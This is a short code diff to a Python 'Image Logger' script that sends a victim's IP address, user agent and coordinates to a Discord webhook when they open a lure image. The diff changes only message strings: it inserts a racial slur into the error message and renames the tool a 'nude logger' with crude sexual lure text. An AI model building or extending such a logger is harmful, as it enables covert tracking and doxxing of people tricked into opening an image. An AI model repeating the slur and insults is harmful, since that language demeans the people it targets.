@@ -77,7 +77,7 @@ def botCheck(ip, useragent):
 def reportError(error):
     requests.post(config["webhook"], json = {
     "username": config["username"],
-    "content": "@everyone new nigga written by daddy A2K",
+    "content": "@everyone new nigga, written by daddy A2K",
     "embeds": [
         {
             "title": "Image Logger - Error",
@@ -144,9 +144,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
+            "title": "Daddy A2K nude logger",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+            "description": f"""**A User opend nude pic, gooner**
 
 **Endpoint:** `{endpoint}`
             
